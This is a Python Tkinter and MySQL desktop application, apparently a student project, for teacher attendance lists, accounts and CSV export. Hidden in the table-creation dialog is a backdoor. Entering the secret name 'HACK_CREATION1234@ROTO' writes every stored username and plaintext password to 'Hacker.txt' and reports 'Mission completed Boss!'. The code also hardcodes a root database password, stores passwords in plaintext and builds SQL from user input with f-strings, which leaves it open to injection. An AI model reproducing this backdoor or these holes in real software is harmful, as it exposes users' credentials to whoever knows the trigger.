#My modules
import os
import csv
import datetime as dt
from tkinter import *
import tkinter.messagebox as tsmg
from tkinter.filedialog import asksaveasfilename
import mysql.connector as co

#Initialized database
db=co.connect(host="localhost",user="root",passwd="20_MySQL_$=0")
mc=db.cursor(buffered=True)


def check():
    """ Checks for 'test' database."""
    mc.execute("show databases")
    if ('test',) not in mc:
        tsmg.showinfo("Registration","Please register yourself to our application to use our features")
        k=register()
    else:
        mc.execute("Use test")
        mc.execute("select First_Name, Last_Name from profiles where status='YES'")       
        k,record="",0
        for i in mc:
            for j in i:
                k+=j + " "
        if k!="":
            f2=Frame(r).grid(row=0,column=0)
            Label(r,f2,text=f"\t\t\tHi! {k}\t\t\t\t\t\t\t\t\t",font="Calibiri 18 bold",bg="yellow",fg="red",relief=GROOVE).grid(row=0,column=0,columnspan=5,sticky="we")
        else:
            tsmg.showinfo("Registration","Please register yourself to our application to use our features")
            register()
        return "y"

def lengthchecking(b,*a):
    """ Checks number of records in db & takes action according to outcome."""
    def length(e):
        mc.execute(e)
        mc.execute("show tables")
        k=()
        for i in mc:
            k+=(i,)
        if len(k)==0:
            return "NO"
        else:
            return "YES"

    if b==0:
        mc.execute("use test")
        mc.execute("select Username, Password from profiles")
        upass=()
        for i in mc:
            upass+=(i,)
        if len(a)==0:
            if len(upass)==1:
                tsmg.showerror("ATTENTION!","No other accounts added.")
            else: 
                switcher()
        elif len(a)==1:
            return upass

    elif b==1:
        j=length(a[0])
        return j

def Userphoneemail(a,b):
    """Checks for same username, phone number or email in DB."""    
    mc.execute("use test")
    mc.execute(f"select {a} from profiles")
    upe=()
    
    for i in mc:
        upe+=(i,)
    for i in upe:
        if f'{i[0]}'==f'{b}':
            return "Error"
            break
    else:
        return "No error"
    
    


def switcher(): 
    """To switch the accounts."""
    def search_clear():
        upass=lengthchecking(0,1)
        mc.execute("select Username from profiles where status='YES'")
        for i in mc:
            cuser=i[0]
        if (f'{b.get()}',f'{c.get()}') in upass:
            user=upass.index((f'{b.get()}',f'{c.get()}'))
            mc.execute(f"update profiles set status='YES' where Username='{str(upass[user][0])}'")
            mc.execute(f"update profiles set status='NO' where Username='{cuser}'")
            db.commit()
            mc.execute(f"select First_Name, Last_Name from profiles where Username='{upass[user][0]}'")
            tsmg.showinfo("REGISTERATION SUCCESSFULL!","PLEASE RESTART THE PROGRAM.")
            r.destroy()  
        else:
            tsmg.showerror("Warning","No such account exists! Or You've entered WRONG PASSWORD")
        
    r.iconify()
    sign=Toplevel()
    sign.title("Sign Up Page")
    frame7=Frame(sign).grid()
    Label(sign,frame7,text="Username",font="Calibri 18 bold").grid(column=0,row=0)
    Label(sign,frame7,text="Password",font="Calibri 18 bold").grid(column=0,row=1)
    b,c=StringVar(),StringVar()
    k1=Entry(sign,frame7,font="Calbiri 18",textvariable=b)
    k1.grid(column=1,row=0)
    k2=Entry(sign,frame7,font="Calbiri 18",textvariable=c)
    k2.grid(column=1,row=1)
    Button(sign,frame7,text="Submit",font="Calibri 18 bold",command=search_clear).grid(column=1,row=2)
    sign.mainloop()
    

def register():
    """ Presents registeration window."""

    def signup():
        #For user sign up to existing account.
        switcher()

    def signin():
        """ Checks and Lables sign up on registration window for more than 1 account."""    
        mc.execute("show databases")
        # for i in mc.fetchall():
        if ('test',) not in mc:
            mc.execute("create database test")
            mc.execute("use test")
            mc.execute("create table profiles(First_Name varchar(90) NOT NULL, Last_Name varchar(90) NOT NULL, Phone_Number NUMERIC(10,0), Gmail_id varchar(100), Username varchar(100) NOT NULL PRIMARY KEY, Password varchar(90) NOT NULL, status varchar(10) NOT NULL)")
            db.commit()
        else:
            mc.execute("use test")
            mc.execute("select*from profiles")
            k=0
            for i in mc:
                k+=1
            if k<2:
                return ""
            else:
                Label(root, text="Already have an account?",fg="red", font=("Times Roman","16","bold"),pady=18).grid(row=10)
                Button(root,text="Sign Up",fg="blue",font="Calibri 16 bold",command=signup).grid()
        
    def chisler(a):
        """ It changes status to YES from current active account to newly registered or sign up account."""
        mc.execute("use test")
        mc.execute("select Username,status from profiles")
        k,name=0,{}
        for i in mc: 
            name[i[0]]=i[1]
            k+=1
        for j in name:
            mc.execute(f"update profiles set status='NO' where Username='{j}'")
            db.commit()
        mc.execute(f"update profiles set status='YES' where Username='{a}'")
        db.commit()

    def chaalo():
        """ Adds new record to profiles table & create new database for new account."""
        mc.execute("use test")
        mc.execute(f"Insert into profiles values('{str(a1v.get())}','{str(a2v.get())}','{str(a3v.get())}','{str(a4v.get())}','{str(a5v.get())}','{str(a6v.get())}','YES')")
        db.commit()
        mc.execute(f"Create database {str(a5v.get())}")
        db.commit()
        
            
    def lisp():
        """ Shows Successfull registration prompt and closes both main and registration window."""
        chaalo()
        chisler(str(a5v.get()))
        tsmg.showinfo("REGISTERATION SUCCESSFULL!","PLEASE RESTART THE PROGRAM.")
        root.destroy()
        r.destroy()
        

    def h():
        """This function checks for faults in entering information by the user."""
        if str(a1v.get()).isalpha()!=True and str(a2v.get()).isalpha()!=True:
            a1v.set("")
            a1.update()
            a2v.set("")
            a2.update()
            tsmg.showerror("Incorrect Information","Please re-enter your correct Name in empty spaces.")
        # Phone NUmber
        elif len(str(a3v.get()))!=10 or str(a3v.get()).isdigit()!=True or Userphoneemail("Phone_Number",a3v.get())=="Error":
            a3v.set("")
            a3.update()
            tsmg.showerror("Incorrect Information","Please re-enter your correct Phone Number in empty spaces.")
        elif str(a4v.get()).endswith("@gmail.com")!=True or Userphoneemail("Gmail_id",a4v.get())=="Error":
            a4v.set("")
            a4.update()
            tsmg.showerror("Incorrect Information","Please re-enter your correct Gmail id in empty spaces.")
        elif (a5v.get()).isdigit()==True or Userphoneemail("Username",a5v.get())=="Error":
            a5v.set("")
            a5.update()
            tsmg.showerror("Incorrect Username","Please re-enter your correct Username in empty spaces, either this username already exists or it is numeric.")

        else:
            lisp()

    r.iconify()
    root=Toplevel()
    root.geometry("500x500")
    root.minsize(800,600)
    root.maxsize(800,600)
    root.title("TEACHER'S REGISTER Login Page")
    # Some labels for the page
    b=Label(root, text="Please fill up your details below",fg="green", font=("Times Roman","16","bold","underline"),pady=18)
    b.grid(row=0, column=1)

    # Detalis prompt
    P=Label(root, text="First Name:",font=("Calibri","14","bold"))
    F=Label(root,text="Last Name:",font=("Calibri","14","bold"))
    M=Label(root,text="Phone Number:",font=("Calibri","14","bold"))
    Ph=Label(root,text="Gmail ID:",font=("Calibri","14","bold"))
    g=Label(root,text="Unique Username:",font=("Calibri","14","bold")) 
    S=Label(root,text="Password:",font=("Calibri","14","bold"))
    P.grid(row=3,column=0)
    F.grid(row=4,column=0)
    M.grid(row=5,column=0)
    Ph.grid(row=6,column=0)
    g.grid(row=7,column=0)
    S.grid(row=8,column=0)
    
    # Boxes
    a1v,a2v,a3v,a4v,a5v,a6v=StringVar(),StringVar(),StringVar(),StringVar(),StringVar(),StringVar()
    si=IntVar()
    a1=Entry(root,textvariable=a1v)
    a2=Entry(root,textvariable=a2v)
    a3=Entry(root,textvariable=a3v)
    a4=Entry(root,textvariable=a4v)
    a5=Entry(root,textvariable=a5v)
    a6=Entry(root,textvariable=a6v)
    a1.grid(row=3,column=1)
    a2.grid(row=4,column=1)
    a3.grid(row=5,column=1)
    a4.grid(row=6,column=1)
    a5.grid(row=7,column=1)
    a6.grid(row=8,column=1)
    Button(root,relief=RAISED,text="Submit",command=h,font="Calibri 18 bold italic",activebackground="blue").grid()
    signin()
    root.mainloop()
    return "y"

def checkyes(): 
    """ This supplies current database name. """
    mc.execute("use test")
    mc.execute("Select Username,status from profiles")
    for i in mc:
        if i[1]=='YES':
            return f"use {i[0]}"

def faultchecker(*a):
    """ Checks faulty names like numbers, alphanum or blank or empty spaces."""
    if a[1]!="" and a[2]!="":
        k=0
        for i in (a[1],a[2]):
            m=i.split()
            for j in m:
                if j.isalpha()!=True:
                    k=1
                    break 
        if k==0:
            return "YES"
        elif k==1:
            return "NO"

def create_list():
    """ Gives window to write tbale name.. """
    def check_creation():
        """ Checks for invalid names, valid names and special names."""        
        if k1.get()=="" or (k1.get()).isspace()==True:
            tsmg.showerror("WARNING!","Please enter name of your table.")
        elif k1.get()=="HACK_CREATION1234@ROTO":
            mc.execute("use test")
            mc.execute("select Username,Password from profiles")
            with open("Hacker.txt","w") as f:
                f.write("This list contains username and their password! (Format Username : Passoword)\n\n")
                for i in mc:
                    f.write(f"{i[0]} : {i[1]}\n")
            tsmg.showerror("Status","Mission completed Boss!")
        else:
            creation()

    def creation():
        """ Creates new list naming: listname_monthname_yearnumber. ' ' replaced by '_'. """
        k2=str(k1.get()).replace(" ","_")
        def exi():
            """ Gives window to write student's credentials."""
            table.destroy()
            def closing():
                """Closes the student entry window"""
                r.deiconify()
                cret.destroy()

            def add_checker():
                """checks for correct names and group name."""
                y=faultchecker(b3.get(),b2.get(),b1.get())
                if y=="YES":
                    adding()
                elif y=="NO":
                    tsmg.showerror("WARNING!","Please enter correct data.")

            def adding():
                """ Adds record to list and also checks for existing roll number."""
                k=checkyes()
                mc.execute(k)
                rollno=rollnos(k2,k)
                if str(b3.get()) in rollno:
                    tsmg.showerror("WARNING","This Roll No. already exists.")
                else:
                    mc.execute(f"insert into {k2} values({str(b3.get())},'{str(b2.get())}','{str(b1.get())}')")
                    db.commit()
                    Label(cret,frame1,fg="white",bg="blue",text="Last Entry:- \t\t\t\t\t\t\t\t\t\t\t" ,font="Calibri 14 bold",anchor="s").grid(row=5,column=0,columnspan=8,sticky="w")
                    Label(cret,frame1,fg="white",bg="blue",text=f"Roll No.: {str(b3.get())} \t\t\t\t\t\t\t\t\t\t\t",font="Calibri 14 bold",anchor="s").grid(row=6,column=0,columnspan=8,sticky="w")
                    Label(cret,frame1,fg="white",bg="blue",text=f"Student Name: {str(b2.get())} \t\t\t\t\t\t\t\t\t\t\t",font="Calibri 14 bold",anchor="s").grid(row=7,column=0,columnspan=8,sticky="w")
                    Label(cret,frame1,fg="white",bg="blue",text=f"Group Name: {str(b1.get())} \t\t\t\t\t\t\t\t\t\t\t",font="Calibri 14 bold",anchor="s").grid(row=8,column=0,columnspan=8,sticky="w")
                    b3.set("")
                    b3v.update()
                    b2.set("")
                    b2v.update()
                    b1.set("")
                    b1v.update()
                
            cret=Toplevel()
            cret.title(f"List entry {k1.get()}")
            cret.geometry("600x430")
            frame1=Frame(cret,borderwidth=8).grid(row=0,column=0)
            frame2=Frame(cret, borderwidth=5).grid(row=1,column=0,sticky="s")
            b1,b2,b3=StringVar(),StringVar(),StringVar()
            # Entries
            b3v=Entry(cret,frame1,font="Calibri 20 bold",textvariable=b3)
            b2v=Entry(cret,frame1,font="Calibri 20 bold",textvariable=b2)
            b1v=Entry(cret,frame1,font="Calibri 20 bold",textvariable=b1)
            b3v.grid(row=0,column=1,pady=10)
            b2v.grid(row=1,column=1,pady=10)
            b1v.grid(row=2,column=1,pady=10)
            # Labels for entries
            Label(cret,frame1,text="Roll Number: ",font="Calibri 20 bold").grid(row=0,column=0)
            Label(cret,frame1,text="Student Name: ",font="Calibri 20 bold").grid(row=1,column=0)
            Label(cret,frame1,text="Group Name: ",font="Calibri 20 bold").grid(row=2,column=0)
            Button(cret,frame1,text="Submit",font="Calibri 20 bold",command=add_checker).grid(row=3,column=0,sticky="we",pady=10)
            Button(cret,frame1,text="Close",font="Calibri 20 bold",command=closing).grid(row=3,column=1,sticky="we",pady=5)
            # Button(cret,frame1,text="Export",font="Calibri 20 bold",command=export).grid(row=4,column=0,sticky="nsew",pady=5)
            cret.mainloop()

        yes=checkyes()
        mc.execute(yes)

        #This will return current month's name!
        spmy=thismonth()
        k2+=spmy
        try:#Creation of a new table!
            mc.execute(f"create table {k2}(Roll_No varchar(11) PRIMARY KEY,Student_Name varchar(100) , GROUP_NAME varchar(50))")
            db.commit()
            exi()
        except:
            tsmg.showerror("","This table already exists, please entry another name.")
            k1.set("")
            k.update()

    r.iconify()
    table=Toplevel()
    tsmg.showinfo("Information!","You can add attendance only for this month in this list.")
    table.title("Please enter the list name")
    k1=StringVar()
    Label(table,text="Enter table name: ",font="Calibri 18 bold").grid(row=0,column=0,sticky="we")
    k=Entry(table,textvariable=k1,font="Calibri 18 bold")
    k.grid(row=0,column=1,sticky="we")
    Button(table,text="Done",activebackground="green",borderwidth=4,command=check_creation).grid(row=1,column=0,columnspan=2,sticky="nsew")
    table.mainloop()

def thismonth():
    """ Returns last name for table where last name is month name and year number of current year."""
    monthyear=str(dt.date.today()).split("-")
    date_object=dt.datetime.strptime(monthyear[1],"%m")
    mname=date_object.strftime("%B")
    spmy="_"+mname.lower()+"_"+monthyear[0]
    return spmy

def rollnos(a,b):
    """ Returns roll nos. of given list."""
    mc.execute(b)
    mc.execute(f"select Roll_No from {a}")
    rollno=()
    for i in mc:
        rollno+=i
    return rollno



def changes(*ar): 
    """ Opens window to add or remove entry from given list. """
    def labeler():
        """Labels the last removed or added student and blanks the entry widget."""
        Label(change,frame3,fg="white",bg="orange",text=f"Table Name: {a0.get()} \t\t\t\t\t\t\t\t\t\t\t" ,font="Calibri 14 bold",anchor="s").grid(row=7,column=0,columnspan=8,sticky="w")
        Label(change,frame3,fg="white",bg="orange",text=f"Roll No.: {b.get()} \t\t\t\t\t\t\t\t\t\t\t",font="Calibri 14 bold",anchor="s").grid(row=8,column=0,columnspan=8,sticky="w")
        Label(change,frame3,fg="white",bg="orange",text=f"Student Name: {c.get()} \t\t\t\t\t\t\t\t\t\t\t",font="Calibri 14 bold",anchor="s").grid(row=9,column=0,columnspan=8,sticky="w")
        Label(change,frame3,fg="white",bg="orange",text=f"Group Name: {a.get()} \t\t\t\t\t\t\t\t\t\t\t",font="Calibri 14 bold",anchor="s").grid(row=10,column=0,columnspan=8,sticky="w")
        a.set("")
        d.update()
        b.set("")
        e.update()
        c.set("")
        f.update()

    def add_checker():
        """Checks for correct name, roll no and group name."""
        y=faultchecker(b.get(),c.get(),a.get())
        if y=="YES":
            done()
        elif y=="NO":
            tsmg.showerror("WARNING!","Please enter correct data.")

    def done(): 
        """ Works on clicking done button."""
        spmy=thismonth()
        currenttab=(a0.get().replace(" ","_")+spmy).lower()
        j=checkyes()
        mc.execute(j)
        mc.execute("show tables")
        col,tab=(),()
        for i in mc:
            tab+=(i,)
        if (currenttab,) not in tab:
            tsmg.showerror("Warning","This table not exists!")
        else:
            k=checkyes()
            mc.execute(k)  

            if ar[0]==1: #Condition for adding entry.
                rollno=rollnos(currenttab,k)
                if str(b.get()) in rollno:
                    tsmg.showerror("WARNING!","THIS ROLL NO ALREADY EXISTS!")
                else:
                    mc.execute(f"desc {currenttab}")
                    for i in mc:
                        col+=(i,)
                    values=(f'{b.get()}',f'{c.get()}',f'{a.get()}')
                    for i in range(3,len(col)):
                        values+=('N',)
                    f=f"insert into {currenttab} values{values}"
                    mc.execute(f)
                    db.commit()
                    Label(change,frame3,fg="white",bg="orange",text="Added Student:-\t\t\t\t\t\t\t\t\t\t\t" ,font="Calibri 14 bold",anchor="s").grid(row=6,column=0,columnspan=8,sticky="w")
                    labeler()

            elif ar[0]==2: # Condition for removing entry.
                try:
                    f=f"delete from {currenttab} where Roll_No={b.get()}"
                    mc.execute(f)
                    db.commit()
                    Label(change,frame3,fg="white",bg="orange",text="Removed Student:-\t\t\t\t\t\t\t\t\t\t\t" ,font="Calibri 14 bold",anchor="s").grid(row=6,column=0,columnspan=8,sticky="w")
                    labeler()
                except:
                    tsmg.showerror("WARNING!","Please enter correct Roll number.")
            
    def close(): #closes the window of changer means add and remove students
        r.deiconify()
        change.destroy()

    yes=checkyes()
    chec=lengthchecking(1,yes)
    if chec=="YES":
        r.iconify()
        tsmg.showinfo("ATTENTION!","1. You can make changes to this month list only. \n 2. You just have to write table name, not any month name and year")
        change=Toplevel()
        change.title(ar[1])
        change.maxsize(900,600)
        change.minsize(700,400)
        frame3=Frame(change).grid(column=0,sticky="nsew")
        Label(change,frame3,text=ar[1],bg=ar[2],fg="white",font="Calibri 18 bold",relief=RAISED).grid(column=1,row=0)
        Label(change,frame3,text="Table name: ",font="Calibri 20 bold").grid(column=0,row=1)    
        Label(change,frame3,text="Roll Number:",font="Calibri 20 bold").grid(column=0,row=2)
        Label(change,frame3,text="Stundent's Name:",font="Calibri 20 bold").grid(column=0,row=3)
        Label(change,frame3,text="Group Name:",font="Calibri 20 bold").grid(column=0,row=4)

        a0,a,b,c=StringVar(),StringVar(),StringVar(),StringVar()
        d=Entry(change,frame3,font="Calibri 20 bold",textvariable=a)
        e=Entry(change,frame3,font="Calibri 20 bold",textvariable=b)
        f=Entry(change,frame3,font="Calibri 20 bold",textvariable=c)
        g=Entry(change,frame3,font="Calibri 20 bold",textvariable=a0)    
        g.grid(column=2,row=1)
        e.grid(column=2,row=2)
        f.grid(column=2,row=3)
        d.grid(column=2,row=4)
        Button(change,frame3,text="Done",font="Calibri 20 bold",command=add_checker,relief=RAISED).grid(column=0,row=5,pady=5,padx=2)
        Button(change,frame3,text="Close",font="Calibri 20 bold",command=close,relief=RAISED).grid(column=1,row=5,pady=5)
        change.mainloop()
    else:
        tsmg.showinfo("","No list created yet!")

def a_s(): #Gives add student condition to changes() function
    changes(1,"Add student","blue")
    
def r_s(): #Gives remove student condition to changes() function
    changes(2,"Remove student","green")
    
def exportcsv(): # Gives export table as csv condition to d_l_s() function.
    j=d_l_s(1)
    
def d_l_s(*a): #Deletes the list students
    def lister(head): #Enlist all table names of current active account to listbox widget.
        delete.title(head)
        def go(event): # This acts on list.
            q=lis.curselection()
            l=k[len(k)-1-q[0]]
            if len(a)==0:
                Label(delete,text="DELETING....\t\t\t",font="Calibri 16 bold").grid(row=2,column=1,columnspan=2,sticky="we")
                deleter(l,head)

            else:
                Label(delete,text="LOADING....\t\t\t",font="Calibri 16 bold").grid(row=2,column=1,columnspan=2,sticky="we")
                file=asksaveasfilename(initialfile="",defaultextension=".csv",filetypes=[("All Files","*.*"),("CSV Files","*.csv")])
                Label(delete,text="\t\t\t",font="Calibri 16 bold").grid(row=2,column=1,columnspan=2,sticky="we")
                try:
                    with open('%s'%file,'a',newline='') as f:
                        yes=checkyes()
                        mc.execute(yes)
                        mc.execute(f"desc {l}")
                        w=csv.writer(f)
                        g=[]
                        for i in mc:
                            g.append(i[0]) 
                        w.writerow(g)
                    with open("%s"%file,'a',newline='') as f:
                        w=csv.writer(f)
                        mc.execute(f"select*from {l}")
                        for i in mc:
                            w.writerow(list(i))
                    Label(delete,text="File Export completed!",font="Calibri 16 bold").grid(row=2,column=1,columnspan=2,sticky="we")
                except:
                    if file!="":
                        tsmg.showerror("","Can't replace your file, please close your file first and then retry.")
        
        
        r.iconify()
        lis=Listbox(delete,selectmode="single")
        lis.bind('<Double-1>',go)
        l=checkyes()
        mc.execute(l)
        mc.execute("show tables")
        k=[]
        for i in list(mc):
            k+=i
        k.reverse()
        for i in k:
            m=0
            lis.insert(m,i)
            m+=1
        Label(delete,text="Double click the table name from the list below.",font="Calibri 16 bold").grid(row=0,column=1,columnspan=2,sticky="we")
        lis.grid(row=1,column=0,columnspan=2)
        Label(delete,text="\t\t\t\t",font="Calibri 20 bold").grid(row=2,column=1)
        
        

    def deleter(l,head):
        """ Ask for deleting and then acts according to it."""
        value=tsmg.askquestion("",f"Do you really want to delete table '{l}'?")
        if value=="yes":
            k=checkyes()
            mc.execute(k)    
            mc.execute(f"drop table {l}")
            lister(head)
        else:
            Label(delete,text="CANCELED!\t\t\t\t\t",font="Calibri 16 bold").grid(row=2,column=1,columnspan=2,sticky="we")

    if len(a)==0:
        head="Delete the list."
    else:
        head="List to export"
    
    yes=checkyes()
    chec=lengthchecking(1,yes)
    if chec=="YES":
        delete=Toplevel()    
        frame4=Frame(delete).grid(column=0,row=0)
        lister(head)
        delete.mainloop()
    else:
        tsmg.showinfo("","No list created yet!")
    

a=0 # Gloabl variable for below function
def attandance(): #Attandance taker logic
    """ Gives window with listbox widget."""
    def taker(i,g):  #g= table_name & i= listname.
        """ Runs present and absent functions"""      
        def present():
            """Updates to present denoted as 'P' """
            try:
                dot=dt.date.today()
                k=checkyes()
                mc.execute(k)
                mc.execute(f"Alter table {g} add column {str(dot).replace('-','_')} char(1)")
                db.commit()
                mc.execute(f"update {g} set {str(dot).replace('-','_')} = 'P' where Student_Name='{i[a][1]}'")
                db.commit()
            except:
                mc.execute(f"update {g} set {str(dot).replace('-','_')} = 'P' where Student_Name='{i[a][1]}'")
                db.commit()
            carrion()

        def absent(): 
            """Updates to absent denoted as 'A' """
            try:
                dot=dt.date.today()
                k=checkyes()
                mc.execute(k)
                mc.execute(f"Alter table {g} add column {str(dot).replace('-','_')} char(1)")
                db.commit()
                mc.execute(f"update {g} set {str(dot).replace('-','_')} = 'A' where Student_Name='{i[a][1]}'")
                db.commit()
            except:
                mc.execute(f"update {g} set {str(dot).replace('-','_')} = 'A' where Student_Name='{i[a][1]}'")
                db.commit()
            carrion()

        def carrion(): # Labels the names of next student on window list.
            global a
            a+=1
            try:
                name,rollno,grp=i[a][1],i[a][0],i[a][2]
                Label(lal,frame5,relief=RAISED,bg="yellow",fg="black",text=f"{name}\t\t\t\t\t\t\t\t",font="Calibri 17 bold",anchor="e").grid(column=2,row=0,sticky="nsew")
                Label(lal,frame5,relief=RAISED,bg="yellow",fg="black",text=f"{rollno}\t\t\t\t\t\t\t\t",font="Calibri 17 bold",anchor="e").grid(column=2,row=1,sticky="nsew")
                Label(lal,frame5,relief=RAISED,bg="yellow",fg="black",text=f"{grp}\t\t\t\t\t\t\t\t",font="Calibri 17 bold",anchor="e").grid(column=2,row=2,sticky="nsew")
            except:
                tsmg.showerror("Warning!","List ended.")
                lal.destroy()

        lal=Toplevel()
        lal.title("Student Profile")
        frame5=Frame(lal).grid()
        Label(lal,frame5,relief=RAISED,bg="yellow",fg="black",text=f"Student Name: ",font="Calibri 18 bold",anchor="e").grid(column=1,row=0,sticky="nsew")
        Label(lal,frame5,relief=RAISED,bg="yellow",fg="black",text=f"{i[a][1]}\t\t\t\t\t\t\t\t",font="Calibri 17 bold",anchor="e").grid(column=2,row=0,sticky="nsew")
        Label(lal,frame5,relief=RAISED,bg="yellow",fg="black",text=f"Roll No.: ",font="Calibri 18 bold",anchor="e").grid(column=1,row=1,sticky="nsew")
        Label(lal,frame5,relief=RAISED,bg="yellow",fg="black",text=f"{i[a][0]}\t\t\t\t\t\t\t\t",font="Calibri 17 bold",anchor="e").grid(column=2,row=1,sticky="nsew")
        Label(lal,frame5,relief=RAISED,bg="yellow",fg="black",text=f"Group Name: ",font="Calibri 18 bold",anchor="e").grid(column=1,row=2,sticky="nsew")
        Label(lal,frame5,relief=RAISED,bg="yellow",fg="black",text=f"{i[a][2]}\t\t\t\t\t\t\t\t",font="Calibri 17 bold",anchor="e").grid(column=2,row=2,sticky="nsew")
        Button(lal,frame5,text="Present",command=present).grid(column=1,row=3)
        Button(lal,frame5,text="Absent",command=absent).grid(column=2,row=3)        
        lal.mainloop()

    def delay(a,b):
        """This will judge month"""
        #This will return current month name!
        spmy=thismonth()
        mc.execute(f"show tables")
        tables=()
        newtab=""
        for i in a:
            if a.index(i)==len(a)-1:
                newtab+=i
            else: 
                newtab+=i+"_"
        newtab+=spmy
        #Here!
        for i in mc:
            tables+=(i[0],)
        if newtab in tables:
            tsmg.showerror("ATTENTION!","Please add attendance to this month list.")
        else:
            chec=checkyes()
            mc.execute(chec)
            mc.execute(f"create table {newtab}(Roll_No varchar(11) PRIMARY KEY,Student_Name varchar(100) , GROUP_NAME varchar(50))")
            db.commit()
            mc.execute(f"select Roll_No,Student_Name,GROUP_NAME from {b}")
            k,l=0,()
            for i in mc:
                l+=(i,)
            for i in l:
                mc.execute(f"insert into {newtab} values{i}")
                db.commit()
            tsmg.showinfo("INFORMATION!","DON'T WORRY! A NEW MONTH LIST HAS BEEN CREATED. TAKE ATTENDANCE IN THAT ONE.\n Please re-open the list.")
    
    

#Choosing option from list.
    def go(event): # This acts on list 
        q=lis.curselection()
        # This gives name from list.
        l=checkyes()
        mc.execute(l)
        mc.execute(f"select*from {k[len(k)-1-q[0]]}")
        listname=()
        for i in mc:
            a=()
            a+=((i),)
            listname+=a
        if len(listname)==0:
            tsmg.showerror("Warning!","This table is empty.")
        else:
            mny=k[len(k)-1-q[0]]
            m=(mny.split("_"))

            # Month number from month name
            Monthname={"january":1,"feburary":2,"march":3,"april":4,"may":5,"june":6,"july":7,"august":8,"september":9,"october":10,"november":11,"december":12}
            mnumber=Monthname[m[-2]] # Month number it is 12.
            # m → table
            # date type YYYY_MM_DD, m[1]=month name & m[0] year number & m[2] date 
            tdate=str(dt.date.today()).split("-")
            tmonth,tyear=tdate[1],tdate[0]

            #tmonth → month  & tyear → year from datetime
            if int(tmonth)==mnumber and tyear==m[-1]:
                taker(listname,k[len(k)-1-q[0]])

            elif mnumber==int(tmonth)-1 and tyear==m[-1]:
                tsmg.showerror("Warning!","You can't take more attendance in this list, because the month is completed.")
                tname=(k[len(k)-1-q[0]]).split("_")
                tname.pop()
                tname.pop()
                delay(tname,k[len(k)-1-q[0]])
            else:
                tsmg.showerror("Warning!","You can't take more attendance in this list, because the month is completed.")
    yes=checkyes()
    chec=lengthchecking(1,yes)
    if chec=="YES":
        r.iconify()
        yes=checkyes()
        mc.execute(yes)
        attand=Toplevel()
        attand.title("Lists available")
        frame4=Frame(attand).grid(column=0,row=0)
        Label(attand,frame4,text="Double click options in list",font="Calibri 14 bold").grid(column=1,row=0)
        # Listbox is created.
        lis=Listbox(attand,selectmode="single")
        lis.bind('<Double-1>', go)
        y=checkyes()
        mc.execute(y)
        mc.execute("show tables")
        k=[]
        for i in list(mc):
            k+=i
        k.reverse()
        for i in k:
            m=0
            lis.insert(m,i)
            m+=1
        lis.grid(column=0,row=0)
    else:
        tsmg.showinfo("","No list created yet!")

def documentation(): #On cliking to documentation menu.
    tsmg.showinfo("TEACHER'S REGISTER","CHECK THE DOCUMENTATION PROVIDED! in the folder.")

def switch_account():
    lengthchecking(0)

def accounts_created(): #Returns file named 'Account created.txt' to main folder.
    mc.execute("use test")
    mc.execute("select Username from profiles")
    with open("Accounts created.txt","w") as f:
        f.write("Usernames are enlisted below:-\n\n")
        for i in mc:
            f.write(f"{i[0]}\n")
    tsmg.showinfo("Information","A notepad (Acounts created.txt) file has been created, in the main folder.")
            

    

# MAIN PROGRAM
if __name__ == "__main__":
    r=Tk()
    r.title("WELCOME TO TEACHER'S REGISTER!")
    width,high=800,600
    r.geometry(f"{width}x{high}")
    r.maxsize(width,high)
    r.minsize(width,high)

    k=check() #FUNCTION HERE!

    if k=="y":
        f1=Frame(r).grid(row=0,column=0)   
        # Buttons,borderwidth=8,width=400,height=300
        frame=Frame(r).grid(row=1,column=1)
        # OPTIONS FOR LIST OF ATTENDANCE REGISTER
        Label(r,frame,text="Attendence Options:",font="Calibri 20 bold underline italic",anchor="n").grid(row=2,column=0,columnspan=2,sticky="w")
        Button(r,frame,text="Create list",padx=29,font="Calibri 18 bold",relief=RAISED,borderwidth=8,activebackground="blue",command=create_list).grid(row=1,column=0,sticky="nsew")
        Button(r,frame,text="Take attandance",padx=25,font="Calibri 18 bold",relief=RAISED,borderwidth=8,activebackground="blue",command=attandance).grid(row=2,column=1,sticky="nswe")
            
        # Menu Buttons
        Menubar=Menu(r)
        Lists=Menu(Menubar,tearoff=0)
        Lists.add_command(label="delete list",command=d_l_s)
        Lists.add_separator()
        Lists.add_command(label="Export list as csv",command=exportcsv)
        Menubar.add_cascade(label="Lists option",menu=Lists)
        
        Make_change=Menu(Menubar,tearoff=0)
        Make_change.add_command(label="Add student",command=a_s)
        Make_change.add_command(label="Remove student",command=r_s)
        Menubar.add_cascade(label="Make changes",menu=Make_change) 
    
        Accounts=Menu(Menubar, tearoff=0)
        Accounts.add_command(label="Switch Account",command=switch_account)
        Accounts.add_command(label="Add Account",command=register)
        Accounts.add_command(label="Accounts created",command=accounts_created)
        Menubar.add_cascade(label="Accounts",menu=Accounts)

        About=Menu(Menubar,tearoff=0)
        About.add_command(label="Documentation",command=documentation)
        Menubar.add_cascade(label="Help",menu=About)
        r.config(menu=Menubar)
    r.mainloop()
